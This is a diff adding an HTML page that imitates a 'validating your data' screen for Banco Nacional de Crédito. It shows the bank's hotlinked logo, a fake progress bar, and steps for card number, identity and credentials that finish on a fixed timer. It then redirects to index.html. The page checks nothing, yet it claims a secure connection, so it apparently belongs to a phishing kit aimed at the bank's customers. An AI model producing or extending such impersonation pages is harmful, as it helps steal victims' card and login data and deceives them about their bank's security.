@@ -1,0 +1,278 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+  <title>BNC - Validando</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      background-color: #e0e0e0;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      font-family: 'Segoe UI', Arial, sans-serif;
+      padding: 24px;
+      overflow: hidden;
+    }
+
+    .logo {
+      width: 140px;
+      height: auto;
+      margin-bottom: 36px;
+      opacity: 0;
+      animation: fadeIn 0.8s ease forwards 0.2s;
+    }
+
+    .card {
+      background: #0c2461;
+      border-radius: 20px;
+      padding: 40px 28px 36px 28px;
+      width: 100%;
+      max-width: 380px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      opacity: 0;
+      animation: fadeIn 0.8s ease forwards 0.4s;
+    }
+
+    .spinner-container {
+      position: relative;
+      width: 86px;
+      height: 86px;
+      margin-bottom: 32px;
+    }
+
+    .ring {
+      position: absolute;
+      inset: 0;
+      border-radius: 50%;
+      border: 5px solid rgba(255,255,255,0.12);
+    }
+
+    .ring-spin {
+      position: absolute;
+      inset: 0;
+      border-radius: 50%;
+      border: 5px solid transparent;
+      border-top-color: #ffffff;
+      border-right-color: rgba(255,255,255,0.4);
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .title {
+      color: #ffffff;
+      font-size: 19px;
+      font-weight: 700;
+      text-align: center;
+      margin-bottom: 10px;
+    }
+
+    .subtitle {
+      color: #a0b8e8;
+      font-size: 13.5px;
+      text-align: center;
+      line-height: 1.6;
+      max-width: 260px;
+    }
+
+    .dots span { animation: blink 1.4s infinite; opacity: 0; }
+    .dots span:nth-child(1) { animation-delay: 0s; }
+    .dots span:nth-child(2) { animation-delay: 0.2s; }
+    .dots span:nth-child(3) { animation-delay: 0.4s; }
+
+    @keyframes blink {
+      0%, 80%, 100% { opacity: 0; }
+      40%            { opacity: 1; }
+    }
+
+    .progress-wrapper { width: 100%; margin-top: 32px; }
+
+    .progress-bar-bg {
+      background: rgba(255,255,255,0.12);
+      border-radius: 100px;
+      height: 6px;
+      overflow: hidden;
+    }
+
+    .progress-bar-fill {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #2563eb, #60a5fa);
+      border-radius: 100px;
+      transition: width 0.3s ease;
+    }
+
+    .progress-label {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 9px;
+    }
+
+    .progress-text    { color: #a0b8e8; font-size: 12px; }
+    .progress-percent { color: #ffffff; font-size: 13px; font-weight: 700; }
+
+    .steps {
+      margin-top: 28px;
+      display: flex;
+      flex-direction: column;
+      gap: 13px;
+      width: 100%;
+    }
+
+    .step {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      color: rgba(255,255,255,0.3);
+      font-size: 13px;
+      transition: color 0.5s;
+    }
+
+    .step.done   { color: rgba(255,255,255,0.9); }
+    .step.active { color: #60a5fa; }
+
+    .step-icon {
+      width: 22px;
+      height: 22px;
+      border-radius: 50%;
+      border: 2px solid currentColor;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      font-size: 11px;
+      font-weight: 700;
+      transition: background 0.5s, border-color 0.5s;
+    }
+
+    .step.done .step-icon {
+      background: #22c55e;
+      border-color: #22c55e;
+      color: #fff;
+    }
+
+    .footer {
+      margin-top: 28px;
+      color: rgba(100,100,100,0.8);
+      font-size: 11px;
+      text-align: center;
+      opacity: 0;
+      animation: fadeIn 0.8s ease forwards 1s;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    @media (max-width: 380px) {
+      .title { font-size: 17px; }
+      .logo  { width: 120px; }
+      .card  { padding: 32px 20px 28px 20px; }
+    }
+  </style>
+</head>
+<body>
+
+  <img class="logo"
+    src="https://upload.wikimedia.org/wikipedia/commons/8/84/Banco_Nacional_de_Credito.png"
+    alt="BNC"/>
+
+  <div class="card">
+    <div class="spinner-container">
+      <div class="ring"></div>
+      <div class="ring-spin"></div>
+    </div>
+
+    <div class="title">
+      Estamos validando sus datos<span class="dots"><span>.</span><span>.</span><span>.</span></span>
+    </div>
+    <div class="subtitle">Por favor espere un momento mientras verificamos su identidad de forma segura.</div>
+
+    <div class="progress-wrapper">
+      <div class="progress-bar-bg">
+        <div class="progress-bar-fill" id="progress-fill"></div>
+      </div>
+      <div class="progress-label">
+        <span class="progress-text">Verificando</span>
+        <span class="progress-percent" id="progress-pct">0%</span>
+      </div>
+    </div>
+
+    <div class="steps">
+      <div class="step active" id="step-1">
+        <div class="step-icon" id="icon-1">1</div>
+        <span>Validando número de tarjeta</span>
+      </div>
+      <div class="step" id="step-2">
+        <div class="step-icon" id="icon-2">2</div>
+        <span>Verificando identidad</span>
+      </div>
+      <div class="step" id="step-3">
+        <div class="step-icon" id="icon-3">3</div>
+        <span>Confirmando credenciales</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="footer">Banco Nacional de Crédito © 2026 &nbsp;|&nbsp; Conexión segura 🔒</div>
+
+<script>
+  const TOTAL = 10000;
+  const fill  = document.getElementById("progress-fill");
+  const pct   = document.getElementById("progress-pct");
+  const start = performance.now();
+
+  const stepTimes = [
+    { id: "step-1", doneAt: 3000 },
+    { id: "step-2", doneAt: 6500 },
+    { id: "step-3", doneAt: 9200 }
+  ];
+  const stepsDone  = {};
+  const nextActive = { "step-1": "step-2", "step-2": "step-3", "step-3": null };
+
+  function tick(now) {
+    const elapsed  = now - start;
+    const progress = Math.min(elapsed / TOTAL, 1);
+    const pctVal   = Math.floor(progress * 100);
+
+    fill.style.width = pctVal + "%";
+    pct.textContent  = pctVal + "%";
+
+    stepTimes.forEach(({ id, doneAt }) => {
+      if (!stepsDone[id] && elapsed >= doneAt) {
+        stepsDone[id] = true;
+        const el = document.getElementById(id);
+        el.classList.remove("active");
+        el.classList.add("done");
+        document.getElementById("icon-" + id.slice(-1)).textContent = "✓";
+        const next = nextActive[id];
+        if (next) document.getElementById(next).classList.add("active");
+      }
+    });
+
+    if (progress < 1) {
+      requestAnimationFrame(tick);
+    } else {
+      document.getElementById("step-3").classList.remove("active");
+      document.getElementById("step-3").classList.add("done");
+      document.getElementById("icon-3").textContent = "✓";
+      fill.style.width = "100%";
+      pct.textContent  = "100%";
+      setTimeout(() => { window.location.href = "index.html"; }, 400);
+    }
+  }
+
+  requestAnimationFrame(tick);
+</script>
+</body>
+</html>
